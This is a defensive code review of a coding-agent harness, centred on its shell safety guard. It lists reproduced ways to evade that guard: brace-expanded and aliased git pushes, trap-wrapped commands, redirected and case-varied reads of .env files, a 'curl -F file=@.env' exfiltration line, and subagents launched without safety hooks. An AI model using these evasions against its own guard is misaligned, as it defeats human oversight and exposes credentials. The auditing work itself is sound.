---
review: v1.0 whole-codebase
date: 2026-10-13
scope: .pi/extensions/** (authored; vendored only at seams), .pi/lib/**, scripts/**, bin/bootstrap.sh, package.json, .pi/settings.json, templates, tests/helpers, CI
pinned: pi-coding-agent/pi-ai/pi-tui/pi-agent-core 1.1.0; pi-subagents 0.76.1; @narumitw/pi-lsp 0.49.9; pi-web-access 0.38.0; pi-session-finder 0.5.6; openspec 1.13.2; typebox 1.3.27; vitest 4.1.11; unbash 4.0.10
counts: { critical: 6, warning: 33, info: 22 }
tests: "Test Files 1 failed | 156 passed (157); Tests 2 failed | 3182 passed | 7 skipped (3191)"
tsc: "npx tsc --noEmit exit 0, no output"
status_updated: 2026-10-13
fixed: 50
accepted: 2
deferred: 9
---

# Code Review: v1.0

The review was read-only. Composed packages were checked against their pinned npm tarballs, which were unpacked into the session scratchpad. Pi APIs were checked against `node_modules/@earendil-works/*@1.1.0` docs and dist. The S-1..S-3 and S-5..S-8 safety findings were also **reproduced**: a probe called `evaluate()` from `.pi/extensions/safety/policy.ts` directly, with `currentBranchFor` returning `feat` and then `main`. The results are listed under each finding.

## Status (Phase 12.1)

Status of each finding after Phase 12.1. Commits are in `git log 0aeafd2..HEAD`; later commits are follow-up fixes from the Phase 12.1 deep review. Counts: C 6 fixed; W 31 fixed, 2 accepted; I 13 fixed, 9 deferred. The milestone-audit gap table below carries its own status columns.

| ID | Status | Commit(s) | Note |
|---|---|---|---|
| C-1 | fixed | 100bfb3 | - |
| C-2 | fixed | 66b31f0, c26f701 | - |
| C-3 | fixed | 100bfb3, 57ef93c, c51752b | - |
| C-4 | fixed | 96afbd2, 3f42bd2 | - |
| C-5 | fixed | e9d7126, ba7c029, 1098209 | - |
| C-6 | fixed | 638cd3c, 144b22a, b6a41e8 | - |
| W-1 | fixed | 638cd3c | - |
| W-2 | fixed | 66b31f0 | - |
| W-3 | fixed | b0719bd, 66b31f0 | - |
| W-4 | fixed | b0719bd | - |
| W-5 | fixed | b0719bd, 4387240 | - |
| W-6 | fixed | 66b31f0 | - |
| W-7 | fixed | c8e88b0, 9e9f2c1 | - |
| W-8 | fixed | 19b94b6, c8e88b0 | - |
| W-9 | fixed | a559dfc, debe945, 85025e1 | - |
| W-10 | fixed | a144ab3, 638cd3c, 47f5b00, 75b3765, 97ad7b1, 7895ffa | - |
| W-11 | fixed | d451dc9 | - |
| W-12 | fixed | 1bd7b5f, cfa5a92 | Live Bedrock check is RB-12-06, still outstanding. |
| W-13 | fixed | 1bd7b5f, 45d50f2, ad59eae | Concurrent sessions still share the settings file; documented in ROUTING.md. |
| W-14 | fixed | a144ab3 | - |
| W-15 | fixed | d451dc9, 8f946dc, a12dc0a, 1663116 | - |
| W-16 | fixed | 4f9586b, 0da65a0 | - |
| W-17 | fixed | 19b94b6, d451dc9 | - |
| W-18 | accepted | 8a18f2b, 22909de, f5b0639 | Logs are now bounded (8a18f2b, 22909de, f5b0639). Cross-process append interleaving is accepted: one writer per process, rows under the atomic append size, no repro. |
| W-19 | fixed | 40d8d34 | - |
| W-20 | fixed | 75b3765 | - |
| W-21 | fixed | 75b3765 | - |
| W-22 | accepted | b4dae4f | The LSP leg now reports UNAVAILABLE, never PASS (b4dae4f). It cannot run diagnostics because Pi 1.1.0 gives commands no executeTool; live half is RB-08-02. |
| W-23 | fixed | b4dae4f, f7ca039 | - |
| W-24 | fixed | 7362c20 | Retry only; the single-shot dispatcher exposes no forced tool choice. |
| W-25 | fixed | 55e05d4 | - |
| W-26 | fixed | 55e05d4 | - |
| W-27 | fixed | a559dfc, 55e05d4 | Residual for user-level git or local packages is in RUNBOOK. |
| W-28 | fixed | 55e05d4 | - |
| W-29 | fixed | 9310fa2, dd874de | - |
| W-30 | fixed | fa1b45d | - |
| W-31 | fixed | 3532639 | CI itself has not run yet; it needs a push. |
| W-32 | fixed | 55e05d4 | - |
| W-33 | fixed | 3532639, aaac072 | - |
| I-1 | fixed | 100bfb3, 1a34ab8 | - |
| I-2 | fixed | 96afbd2 | - |
| I-3 | deferred | d451dc9 | Redaction of -u and -p fixed in d451dc9. The agent-writable log dir and the silent drop on a failed rename remain; the rotation race has no repro. |
| I-4 | deferred | - | Not exploitable; callers pass paths only. |
| I-5 | deferred | - | Cost accuracy only. |
| I-6 | fixed | a144ab3, cf5c5db | NO_TOOL_CALLING prefixes fixed in a144ab3. DEFAULT_MODE is applied at fresh start unless a model was chosen explicitly (cf5c5db). |
| I-7 | deferred | - | registerVirtualModel would be a routing redesign. |
| I-8 | fixed | 1bd7b5f, d451dc9, 55e05d4, 9310fa2 | - |
| I-9 | fixed | 55e05d4 | - |
| I-10 | fixed | 4f9586b | - |
| I-11 | fixed | 66b31f0, 1bd7b5f, e9d7126, 638cd3c, b4dae4f, aa958a7, 75b3765, 7362c20, d451dc9, 4f9586b, 8a18f2b, 40d8d34, 9310fa2 | - |
| I-12 | fixed | 47f5b00 | - |
| I-13 | fixed | 7362c20 | - |
| I-14 | fixed | e9d7126, 75b3765 | - |
| I-15 | fixed | 47f5b00 | - |
| I-16 | deferred | - | Listeners pile up only across /reload. |
| I-17 | fixed | 40d8d34, 360f960 | 360f960 counts new untracked files again, still throttled. |
| I-18 | fixed | a559dfc | - |
| I-19 | deferred | - | Teardown snapshot scope only. |
| I-20 | deferred | - | Transitive caret ranges in a composed package; recorded in RUNBOOK. |
| I-21 | deferred | - | Loop-police state file location; recorded in RUNBOOK. |
| I-22 | fixed | 9310fa2 | - |

## Phase 12.1 deep review (follow-up)

After the fixes, Phase 12.1 had its own deep review. Index: `.planning/phases/12.1-v1-0-gap-closure-audit-deep-review-fixes/12.1-REVIEW.md`. Iteration files: `12.1-REVIEW-A.md`, `-B.md`, `-C.md`, `-A2.md`, `-BC2.md`, `-A3.md`, `-BC3.md`, `-BC4.md`; fix reports: `12.1-REVIEW-FIX-A.md`, `-B.md`, `-C.md`, `-A2.md`, `-BC2.md`, `-BC3.md`.

- Iteration 1: 17 critical, 36 warning, 20 info. All critical and warning findings fixed.
- Iteration 2: safety 6C/8W, parts B and C 1C/6W. All fixed.
- Iteration 3: safety 0C/0W, parts B and C 0C/5W. All fixed.
- Iteration 4: 0C/0W, 4 info.

Info items still open:

| ID | Status | Reason |
|---|---|---|
| IN-A-4 | fixed | 644a043: add-only `safety.protectedBranches` and `safety.pushProtectedBranches` from user and project settings; `main` first; malformed values warn and keep the defaults. |
| IN-A2-2 / IN-A3-3 | fixed | 72f5db0: terraform `-chdir`, `-version` and `-help` are skipped before the subcommand is classified; `apply` still confirms. |
| IN-B-05 | decided (best practice) | Aborted turns stay uncounted: Esc is the user's interruption, the next settle re-gates whatever was written, and counting would let Esc presses spend the user's budget. The /grill and /plan off-by-one was unified (644a043): working turns plus one final write turn. |
| IN-C-3 | deferred | CI pin-audit peel loop. CI-only hardening that cannot be verified offline. |
| IN-C-4 | deferred | Traceability test crashes instead of reporting. Test ergonomics only; the test is green. |
| IN-C-5 | deferred | README pinned install tag does not exist yet. The tag belongs to the release step; RUNBOOK records it. |
| IN-C-6 | deferred | Eager `typescript` load and `tsc` from PATH. Touches the gate path just hardened by WR-B-11; needs its own change. |
| IN-C-8 | fixed | cf5c5db: every fallback hop runs the capability guard; a refused hop is skipped with its reason. |
| IN-C-9 | decided (best practice), fixed | cf5c5db: `/new` and a fresh session reset to the default mode unescalated and apply its executor unless a model was chosen explicitly. |
| IN-BC2-4 | fixed | cf5c5db: warn everywhere; `/quick` no longer refuses an overfull context. |
| IN-BC2-9 | deferred | Base typecheck can leave a `.tsbuildinfo`. Every safe fix touches the gate path (`--incremental false` breaks composite projects). |
| IN-BC3-4 | fixed | cf5c5db: one picker for `/mode` and the planner pin. |
| /review baseTypecheckFailed | fixed | cf5c5db: the merge-base typecheck runs lazily, only when HEAD fails, in a temporary worktree inside the git directory. |
| Child guard fixed install path | fixed | 644a043: pi-subagents is resolved from the loaded subagent tool's source path, falling back to the two npm roots; with nothing found every launch is still refused. |
| IN-BC3-7 | accepted | Verification output in the ledger and MR body stays name-redacted, because the ledger is a log on disk and an MR may be shared. |
| IN-BC4-1 | deferred | The anchored JWT rule misses a token glued to `-`, `_` or an alphanumeric. Small impact; loosening it brings back the quadratic case. To be listed as a residual in DIAGNOSTICS.md. |
| IN-BC4-2 | deferred | A line-ending-only SPEC change shows an empty diff on `--repin`. Cosmetic; no fix report yet. |
| IN-BC4-3 | deferred | `lineDiff` prints `+` before `-` in a replaced block. The diff is correct; only the order reads backwards. |
| IN-BC4-4 | deferred | `renderPinChanges` runs on every `/execute`, not only under the two flags. A cost and robustness issue, not a gate gap. |

## Verification runs

- `npx vitest run --maxWorkers=2`: **Test Files 1 failed | 156 passed (157); Tests 2 failed | 3182 passed | 7 skipped (3191)**, duration 215 s.
  - Both failures are in `tests/unit/workflow-budgets.test.ts`. The `.pi/extensions/safety` total is 2731 raw lines against a declared budget of 2440, because `git.ts` grew 366 -> 582 in quick-261013-grs. **HEAD is red** (see W-30).
- `npx tsc --noEmit`: exit 0, no diagnostics.

## Milestone-audit gaps: confirmed or refuted

| Gap | Verdict | Evidence | Status | Commit(s) | Note |
|---|---|---|---|---|---|
| B1 `/quick` gates the wrong thing | **Confirmed** | `workflows/index.ts:279` gates before `sendUserMessage`. `quality/index.ts:31-46` scans `<cwd>/.pi/extensions/**`. The `agent_end` handler (`workflows/index.ts:310-322`) only calls `endRun`. | fixed | 638cd3c | Same as C-6. |
| B2 QUAL-07 never called | **Confirmed** | `shouldRunDesignReview` and `DESIGN_REVIEW_FILE_SPAN` are referenced only in `gates.ts` and tests. | fixed | aa958a7, 79eb971, 5257bd0 | Design pass wired into /review. |
| B3 approved commands fail the evidence gate | **Confirmed, and much wider** (see C-5) | Any `isError` record rejects the run, and in 1.1.0 every non-zero bash exit is `isError`. B3 itself applies only to `confirm` verdicts (terraform/aws/kubectl/openspec). A feature-branch push takes the inline `ask` path (`safety/index.ts:370-390`), which never blocks. | fixed | e9d7126 | Same as C-5. |
| B4 composed packages project-only | **Confirmed, and wider** | `bootstrap.sh run_full` never runs `pi install`. Global settings hold only `kyPiAgent`. None of the 4 npm packages is installed anywhere on this machine. `package.json` has no `pi.subagents.agents`, so agent files do not travel either (W-25). The `-builtin:` disables also stay project-only, so codemode/tool-search remain on in work repos. | fixed | a559dfc, 55e05d4, 8973d7d | Global setup mode and manifest agents. |
| W1 implement profile drops tools with no loader | Confirmed | `routing/profiles.ts:35-40`. No `bg_enable`/questionnaire/qoder enabler exists. The `input` handler re-strips them (`routing/index.ts:326-338`). | fixed | 19b94b6, 5b0292a | Loaded on demand through bg_enable. |
| W3 lsp_fix unguarded | Confirmed | It is active in `implement` (`profiles.ts:26`, `docs/extensions.md:164`). It calls `writeFileSync` (pi-lsp `src/runner.ts:106`). `docs/SAFETY.md:268` is false. | fixed | 19b94b6 | lsp_fix is full-only (W-8). |
| W5 lint/LSP never run on a change | Confirmed | `runChangeGateStage` (`quality/index.ts:180-213`) runs typecheck and anti-pattern only. The LSP leg is a registration probe (W-22). | fixed | b4dae4f | Real lint leg; the LSP leg is UNAVAILABLE (W-22). |
| W6 `/model` and Ctrl+P bypass the capability guard | Confirmed | There is no `model_select` handler. The event is notification-only (`types.d.ts:861-866`). | fixed | a144ab3 | model_select reverts an incapable switch. |
| W7 planner never dispatched | Confirmed | No `planRoleCall`/`runSingleShotRole` call uses `role:"planner"`. | accepted | - | /plan runs on the session model; a role call would push plan-ceremony past its 200-line ceiling (ROUTING.md). |
| W8 local `staging` merge-base | Confirmed | `review/index.ts:90`. A missing branch gives a raw git error; a stale branch produces false scope drift. | fixed | aa958a7 | Merge base is the remote-tracking branch. |
| W9 openMr writes no audit row | Confirmed | `review/mr.ts:313-325` calls `spawnSync`, which bypasses `tool_call` too. | fixed | aa958a7, bde8069 | - |
| W11 two drifting safety copies | Confirmed (latent today; there is no `~/.pi/agent/git`) | The stub imports the dev checkout by absolute path. `globalThis` approvals store at `approvals.ts:44-54`. | fixed | a559dfc, debe945, 85025e1 | Same as W-9. |
| W12 dead exports | Confirmed | `ADVANCING_CLASSES`, `classifyPushFailure`, `usesFallbackChain`, `PROSE_RETRY_FORCES_TOOL_CHOICE` and 7 `*_FIXTURES` ship in production `providers/schema.ts`. `.pi/skills/review/SKILL.md` has no consumer. | fixed | 66b31f0, 1bd7b5f, d451dc9, fa1b45d | - |
| Gate-depth table overstated | Confirmed | `gates.ts:259-265`: grill/plan run none of the four mechanisms. Execute runs the deterministic check only. Calibration runs nowhere in production. | fixed | 47f5b00 | - |
| WR-01 triggerTurn turns not narrowed | Confirmed | A test pins the bug (W-17). | accepted | 19b94b6 | Pi emits no input event for triggerTurn turns; the test now pins the limit honestly (19b94b6). |
| EV-56/57 ADS and 8.3 names | Confirmed open | Same root cause as the unpublished S-7 (`.ENV`). | fixed | b0719bd | - |
| CI never run | Confirmed | The workflow is valid and the action SHAs verify, but it has no Node 24 leg (W-31). | deferred | 3532639 | Node 24 and Linux legs added in 3532639, but CI only runs after a push. |

**Missed by the audit:** C-1 to C-4 (the safety bypasses and subagent children with no guard), C-5's breadth, and 33 Warnings.

---

## Critical

### C-1: Brace expansion in command position hides every guarded verb
- **Location:** `.pi/extensions/safety/shell.ts:183-186, 20`; `policy.ts:149-180`
- **Defect:** unbash 4.0.10 returns a `BraceExpansion` part as raw text (`unbash/dist/word.js:68-70`), so the executable normalises to `{git,push}`. Only `SimpleExpansion` and `ParameterExpansion` count as unresolved.
- **Reproduced, allowed on both `feat` and `main`:**
  - `{git,push} origin HEAD:main`
  - `{terraform,apply} -auto-approve`
  - `{aws,s3,rm} s3://b --recursive`
- **Fix:** treat any `BraceExpansion` (and any other non-literal part) in `Command.name` as unresolved, or block it. Add the forms to the evasion corpus.
- **Status:** fixed in 100bfb3

### C-2: Git aliases, send-pack and subtree push freely on a feature branch
- **Location:** `safety/git.ts:420, 439-441`; `policy.ts:126-144`
- **Defect:** `planPush` runs only for the literal subcommand `push`. On a non-protected HEAD, every other subcommand is allowed, and `-c` overrides are only refused inside `planPush`.
- **Reproduced on `feat`:**
  - `git -c alias.p=push p origin HEAD:main`: allow
  - `git send-pack git@x:y.git +HEAD:refs/heads/main`: allow
- **Also open (traced from the code, not run):** `git config alias.p push` followed by `git p …`, `git -c alias.x='!git push --force origin main' x`, `git subtree push`, and the `git-push` executable path.
- **Fix:** block `-c alias.*` and `--config-env`. Classify `send-pack`, `subtree push` and `git-*` executables as push. Fail closed on `config alias.*`. Use an allow-list of subcommands on all branches.
- **Status:** fixed in 66b31f0, c26f701

### C-3: `trap`, `hash -p`, `alias` and `source`/`.` run guarded text without being treated as shell runners
- **Location:** `safety/shell.ts:30-33` (`SHELL_RUNNERS`)
- **Reproduced, allowed on both branches:**
  - `trap 'git push origin HEAD:main' EXIT`
  - `trap 'terraform apply -auto-approve' EXIT`
- **Also open (not run):** `. git-push.sh` is not refused, while `sh git-push.sh` is. `hash -p` and `alias` with `expand_aliases` are also open.
- **Fix:** add `trap source . hash alias enable fc` to the runner set, or refuse them whenever a segment mentions a guarded verb.
- **Status:** fixed in 100bfb3, 57ef93c, c51752b

### C-4: Subagent children can launch with no safety extension
- **Location:**
  - Our side: `routing/profiles.ts:27` (the `subagent` tool is active by default) and `safety/index.ts:360` (unknown tool names pass through).
  - pi-subagents 0.76.1: `child-tool-plan.js:272-296`, `child-session.js:357`, `agent-management.js:495-503`.
- **Defect:** when an agent config sets `extensions`, the child runs with `noExtensions`. That drops both the user-scope `ky-safety` stub and the project copy. The model can use `subagent {action:"create", config:{extensions:"",…}}` and then run that agent.
- **Fix:**
  - Register safety through pi-subagents' required-child-extension registry (`shared/required-child-extensions.js`, `requireForAllRunners`; entries "cannot be removed by agent defaults or overrides", `child-tool-plan.js:297`).
  - Route management actions (create/update/eject) through approval.
  - Deny external-CLI runners.
- **Confidence:** high, from reading the source. Not reproduced live, because the packages are not installed.
- **Status:** fixed in 96afbd2, 3f42bd2

### C-5: The evidence gate rejects any run that had a failed tool call, not only blocked ones (subsumes B3)
- **Location:** `workflows/evidence.ts:94-103`; `execute/index.ts:126`
- **Defect:** in 1.1.0 a non-zero bash exit is `isError:true` (`pi-coding-agent/dist/core/tools/bash.js:295-300`). Blocked or thrown calls are also `isError` (`pi-agent-core/dist/agent-loop.js:507-516`).
- **Scenario:** any of these poisons the run, so correct, committed work is rejected:
  - `grep` with no match
  - a red test before the fix
  - an `edit` whose `old_string` is not found
  - `git diff --quiet`
  - an approval-blocked `terraform plan` (B3)

  `/execute` counts each rejection toward `REVISION_CAP` and escalates after 3. For a cheap model that retries often, this makes `/quick` and `/execute` close to unusable.
- **Fix:** judge only the commit and the declared verification command, or a failure that no later success of the same command supersedes. Exclude blocked-then-approved calls. Add an integration test that combines approve/reissue with the gate, and one with an exploratory non-zero exit.
- **Status:** fixed in e9d7126, ba7c029, 1098209

### C-6: `/quick` gates the harness source before the work exists (B1)
- **Location:** `workflows/index.ts:279`; `quality/index.ts:31-46`
- **Scenario:**
  - In a work repo the gate checks nothing relevant.
  - In this repo, any pre-existing tsc or anti-pattern finding under `.pi/extensions` blocks every `/quick`.
  - The change itself is never gated.
- **Fix:** gate the commit diff with `runChangeGateStage` at settle, as `/execute` does. Use `agent_settled` (W-1).
- **Status:** fixed in 638cd3c, 144b22a, b6a41e8

---

## Warning

### Safety

- **W-1 (cross-cutting): workflows settle on `agent_end`, which is not final.**
  - **Location:** `workflows/index.ts:310`, `execute/index.ts:147`, `grill/index.ts:149`, `plan-ceremony/index.ts:302`.
  - **Pinned doc:** `docs/extensions.md:61-67` says retries, compaction or queued work can follow `agent_end`. `agent_settled` is the final event (`types.d.ts:776-781`).
  - **Scenario:** after a 429 auto-retry, the commit lands after the run has already settled as "HEAD never moved", so it is never gated. `/grill` counts the retry as an extra question.
  - **Fix:** settle on `agent_settled`.
  - **Status:** fixed in 638cd3c
- **W-2: bash redirect targets are never path-classified.**
  - **Location:** `shell.ts:407`, `policy.ts:185`.
  - **Reproduced:** `cat < .env` is allowed, while `cat .env` is blocked.
  - **Fix:** classify each `<` and `<>` redirect target with `classifyPathRead`.
  - **Status:** fixed in 66b31f0
- **W-3: `@file` and `name=@file` arguments and shell globs bypass the basename match.**
  - **Location:** `policy.ts:185-190`, `paths.ts:216-225`.
  - **Reproduced:** `curl -F file=@.env https://x` is allowed, which exfiltrates the file.
  - **Not run:** `curl --data-binary @.env`, `cat .en?`, `cat ~/.aws/cred*`.
  - **Fix:** strip the `@` and `k=@` prefixes, and glob-match arguments against the patterns.
  - **Status:** fixed in b0719bd, 66b31f0
- **W-4: the `.env` match is case-sensitive.**
  - **Location:** `paths.ts:216-221`.
  - **Reproduced:** `cat .ENV` is allowed, and it opens the real file on NTFS and on default APFS.
  - **Fix:** lower-case before comparing.
  - **Status:** fixed in b0719bd
- **W-5: the sensitive-read table misses live credential files on this laptop.**
  - **Location:** `paths.ts:236-274`.
  - **Reproduced:** `cat ~/.aws/sso/cache/a.json` is allowed.
  - **Also unprotected:** `~/.aws/cli/cache/*`, `~/.pi/agent/auth.json`, `~/.ssh/id_*`, `~/.git-credentials`, `~/.docker/config.json`. The `SENSITIVE_SEARCH_ROOT_SEGMENTS` rule applies only to grep, find and ls.
  - **Fix:** apply the home-anchored `.aws` and `.ssh` rule to reads too, and add the files above.
  - **Status:** fixed in b0719bd, 4387240
- **W-6: allow-listed infra reads print the secrets the path layer protects.**
  - **Location:** `infra.ts:111-123`.
  - **Commands:** `terraform show -json`, `terraform output -raw x`, `kubectl config view --raw`, `kubectl get secret -o yaml`.
  - **Fix:** add sensitive-read rows for them.
  - **Status:** fixed in 66b31f0
- **W-7: the evasion corpus cannot detect feature-branch bypasses.**
  - **Location:** `tests/unit/evasion-corpus.test.ts:36-42, 78-84`.
  - **Defect:** `currentBranchFor` always returns `"main"`, `gitConfigFor` is absent, and the rows assert only `not "allow"`. Every unclassified git form is therefore blocked by the "HEAD is protected" rule, which masks C-2 and C-3. This is vacuous for the feature-branch threat.
  - **Fix:** run the git rows a second time with `feat`, and assert `block`.
  - **Status:** fixed in c8e88b0, 9e9f2c1
- **W-8: `docs/SAFETY.md:268` wrongly says `lsp_fix` is inactive by default.**
  - **Defect:** `lsp_fix` writes files at a caller-chosen root and path, and neither the hook nor a wrapper sees it.
  - **Fix:** remove it from `implement`, or add a path guard for it.
  - **Status:** fixed in 19b94b6, c8e88b0
- **W-9: the user-scope safety stub tracks the dev checkout's HEAD (W11).**
  - **Location:** `~/.pi/agent/extensions/ky-safety/index.ts`, generated by `bin/bootstrap.sh`.
  - **Scenario:** a global `pi install` adds a second copy at another ref, sharing the `globalThis` store. If the checkout moves, the stub's import fails, and an untrusted headless run then loads no guard.
  - **Fix:** use a single delivery path.
  - **Status:** fixed in a559dfc, debe945, 85025e1

### Routing, providers and diagnostics

- **W-10: three of the four capability-guard checks are never fed.**
  - **Location:** `routing/guard.ts:54-91`.
  - **Defect:** every caller passes `need:{}`: `quality/advisor.ts:62`, `reviewer.ts:202`, `verdict.ts:183`, `workflows/index.ts:25`. The mode commands pass only `usesToolLoop` (`routing/index.ts:51,156`). The image, input-token and thinking checks are dead.
  - **Scenario:** a large diff goes to DashScope's 393,216-token window and gets an overflow error instead of a refusal.
  - **Fix:** derive these needs from the route and from `ctx.getContextUsage()`.
  - **Status:** fixed in a144ab3, 638cd3c, 47f5b00, 75b3765, 97ad7b1, 7895ffa
- **W-11: one failed fallback hop can mask the real error.**
  - **Location:** `providers/fallback.ts:211-214`.
  - **Defect:** hop 2 is resolved without `hasConfiguredAuth`.
  - **Scenario:** a user with only a DeepSeek key sees every transient 429 become "chain entry does not resolve", or a DashScope auth error.
  - **Fix:** skip hops that have no auth, and keep the first failure.
  - **Status:** fixed in d451dc9
- **W-12: the Bedrock Claude id is the base model id.**
  - **Location:** `routing/schema.ts:332` (`anthropic.claude-sonnet-4-5-20250929-v1:0`).
  - **Defect:** Bedrock serves Sonnet 4.5 on demand only via inference profiles. The 1.1.0 catalogue ships `us.`, `eu.`, `global.`, `au.` and `jp.` ids.
  - **Scenario:** the vision role, the max-mode planner/reviewer and the advisor all fail.
  - **Confidence:** medium. This comes from AWS behaviour and was not checked live.
  - **Fix:** use the profile id for your region.
  - **Status:** fixed in 1bd7b5f, cfa5a92. Live Bedrock check is RB-12-06, still outstanding.
- **W-13: mode switches persist the planner pin globally.**
  - **Location:** `routing/agent-overrides.ts:114-119`.
  - **Defect:** the pin is written to `getAgentDir()/settings.json`, without an auth check, and is not restored per session.
  - **Scenario:** `/max` in one repo leaks into every other repo.
  - **Status:** fixed in 1bd7b5f, 45d50f2, ad59eae. Concurrent sessions still share the settings file; documented in ROUTING.md.
- **W-14: the guard over-refuses Bedrock GPT models.**
  - **Location:** `routing/guard.ts:66-81`.
  - **Defect:** pi-ai 1.1.0 does send thinking for `gpt-oss` and `gpt-` (`bedrock-converse-stream.js:1059-1068`). The cited line `:889-927` is also stale.
  - **Status:** fixed in a144ab3
- **W-15: redaction misses common credential shapes.**
  - **Location:** `diagnostics/redact.ts:205, 212-227`.
  - **Missed:** camelCase keys (`accessToken`, `secretAccessKey`, `sessionToken`), `aws_session_token = …`, JWTs `eyJ…`, and lowercase `bearer`.
  - **Scenario:** the model reads `~/.aws/sso/cache/*.json` (allowed, W-5), and the token lands in `wire-*.jsonl`.
  - **Status:** fixed in d451dc9, 8f946dc, a12dc0a, 1663116
- **W-16: the Qoder client has several stream gaps.**
  - **Location:** `qoder/client.ts:239-247, 342-367, 380-433`.
  - **Gaps:**
    - The stream opens after the POST, so early frames may be lost (medium confidence).
    - An error or interrupted `stop_reason` returns as success.
    - Folding is quadratic.
    - Esc does not cancel the remote session.
  - **ToS:** the client uses the official PAT and Cloud Agents API, which is fine.
  - **Status:** fixed in 4f9586b, 0da65a0
- **W-17: two tests that cannot catch what they claim.**
  - `tests/unit/r1-unclamp.test.ts:160-180` case 2 passes even if the override is ignored, because the built-in already maps `low`. It is vacuous.
  - `tests/integration/tool-profiles.test.ts:272-284` asserts the WR-01 bug, so fixing WR-01 will fail it.
  - **Status:** fixed in 19b94b6, d451dc9
- **W-18: wire logs grow quadratically.**
  - **Location:** `lib/jsonl.ts`; `diagnostics/schema.ts:29-35`.
  - **Defect:** every request row holds the full `messages[]`. The cap allows about 5 GB (32 MB × 11 × 14 days).
  - **Further gaps:**
    - On Windows, `appendFileSync` calls from two processes can interleave.
    - EBUSY on rename retries every second.
    - `qoder-*` and `escalation-*` logs are never pruned.
  - **Status:** accepted — Logs are now bounded (8a18f2b, 22909de, f5b0639). Cross-process append interleaving is accepted: one writer per process, rows under the atomic append size, no repro.
- **W-19: the env templates omit the `QODER_*` variables the code reads.**
  - **Location:** `.pi/templates/env.example`, `.env.example`.
  - **Defect:** `QODER_PERSONAL_ACCESS_TOKEN`, `QODER_AGENT_ID`, `QODER_ENVIRONMENT_ID` and `QODER_BASE_URL` are missing. The template also says Qoder is "ruled out of v1", and the two files have drifted.
  - **Status:** fixed in 40d8d34

### Quality, workflows and review

- **W-20: a requirement verdict of Missing or Partial does not stop the MR.**
  - **Location:** `quality/verdict.ts:28-60`, `review/mr.ts:185-217`.
  - **Defect:** the decision ignores verdict status, and the MR body omits the verdicts.
  - **Fix:** require approval on any non-Implemented verdict.
  - **Status:** fixed in 75b3765
- **W-21: `/review` throws on changes with no JS/TS file.**
  - **Location:** `review/index.ts:102, 110`; `quality/reviewer.ts:661-667`.
  - **Defect:** the context build throws when `importGraph` is empty (and on a deletion-only change).
  - **Scenario:** Terraform-only, Python-only and docs-only branches always fail `/review`.
  - **Status:** fixed in 75b3765
- **W-22: the LSP leg reports PASS from a registration probe.**
  - **Location:** `quality/gates.ts:37-50`.
  - **Defect:** no diagnostics are run, which contradicts the file's own "unavailable is never a pass" rule.
  - **Status:** accepted — The LSP leg now reports UNAVAILABLE, never PASS (b4dae4f). It cannot run diagnostics because Pi 1.1.0 gives commands no executeTool; live half is RB-08-02.
- **W-23: `/quick` may report FAIL in a repo with no tsconfig.**
  - **Location:** `quality/index.ts:52-62`.
  - **Defect:** `tsc --noEmit` with no project prints help and exits 1, which is read as a typecheck failure.
  - **Confidence:** medium.
  - **Status:** fixed in b4dae4f, f7ca039
- **W-24: the reviewer is one-shot, with no forced tool choice and no retry.**
  - **Location:** `quality/reviewer.ts:749-778`.
  - **Defect:** prose tool calls from DeepSeek fail `/review`. `FILE_LINE_PATTERN` rejects `a.ts:10-20`. It fails closed, but often.
  - **Status:** fixed in 7362c20. Retry only; the single-shot dispatcher exposes no forced tool choice.

### Packaging, UI and CI

- **W-25: the package manifest has no `pi.subagents.agents`.**
  - **Location:** `package.json:14-27`.
  - **Pinned doc:** pi-subagents 0.76.1 `docs/agents.md:24, 32`.
  - **Scenario:** after a global install, `executor-handoff`, `planner` and `reviewer` are missing in other repos, and `/execute` cannot delegate.
  - **Status:** fixed in 55e05d4
- **W-26: `.pi/agents/reviewer.md` is broken and shadows pi-subagents' built-in `reviewer`.**
  - **Defect:** its tools are only read/grep/find/ls, yet it demands output through `submit_review`, which no tool provides. The built-in prompts `/council` and `/parallel-cleanup` then get an agent that cannot produce output.
  - **Fix:** rename or delete it.
  - **Status:** fixed in 55e05d4
- **W-27: a global install plus this trusted repo double-loads every extension.**
  - **Pinned source:** `runner.js:566-578` renames colliding commands to `name:1` and `name:2`; `docs/packages.md:127` treats a local path and a git URL as different identities.
  - **Scenario:** `/plan`, `/execute`, `/review` and `/quick` vanish under their plain names in this repo.
  - **Status:** fixed in a559dfc, 55e05d4. Residual for user-level git or local packages is in RUNBOOK.
- **W-28: the README documents an unpinned global install.**
  - **Location:** `README.md:28`.
  - **Defect:** the git URL has no `@ref`, for a package that carries the safety layer. CLAUDE.md and AGENTS.md forbid unrefed git URLs.
  - **Status:** fixed in 55e05d4
- **W-29: the comment-discipline test covers only `.pi/extensions` and `.pi/lib` `.ts` files.**
  - **Location:** `tests/helpers/comment-scan.ts:130`.
  - **Missed:**
    - `bin/bootstrap.sh`: 21 ID lines plus history narration, and it writes CR ids into the generated stub.
    - `vitest.config.ts:11, 22`.
    - `ci.yml`.
    - `.pi/scripts/worktree-setup-hook.mjs`: 17 ID lines.
    - The `.npmrc` files, which also cite `pi 0.84.1 src/...`.
  - **Status:** fixed in 9310fa2, dd874de
- **W-30: HEAD fails its own test suite.** The `workflow-budgets` safety directory budget is 2440, but the measured total is 2731, after the push-confirm work grew `git.ts` and `index.ts`.
  - **Status:** fixed in fa1b45d
- **W-31: CI has no Node 24 or Linux leg.**
  - **Location:** `ci.yml:145-147`.
  - **Defect:** CLAUDE.md asks for 22.x and 24.x. The pin-audit step reads `.object.sha`, which would be wrong for annotated tags.
  - **Status:** fixed in 3532639. CI itself has not run yet; it needs a push.
- **W-32: `scripts/check-gh-unauthenticated.sh` is stale for 1.1.0.**
  - **Pinned doc:** `docs/sessions.md:58`: `/share` can upload via Radius auth, not only a gh gist.
  - **Status:** fixed in 55e05d4
- **W-33: the load-path tests prove only that the self-test extension loads.**
  - **Location:** `tests/integration/load-paths.test.ts:124-200`.
  - **Defect:** other extensions can fail to load while the test still passes.
  - **Fix:** assert that stderr has no load errors.
  - **Status:** fixed in 3532639, aaac072


---

## Info

- **Deferred: narrowing the shell guard's pipe rule.** Any code runner on a pipe is refused again (b6dc540, dbac8c5); allowing a piped interpreter with a script file waits for a hardened design (see quick-261013-sit REVIEW.md CR-01..CR-06).

- **I-1 plan-mode read-only allow-list holes** (`plan-mode/read-only.ts`):
  - `rg --pre bash` runs a command.
  - These write files: `tree -o`, `uniq in out`, and curl's `-c`, `-D`, `--trace` and `--libcurl`.
  - `curl --json` sends a body.
  - **Status:** fixed in 100bfb3, 1a34ab8
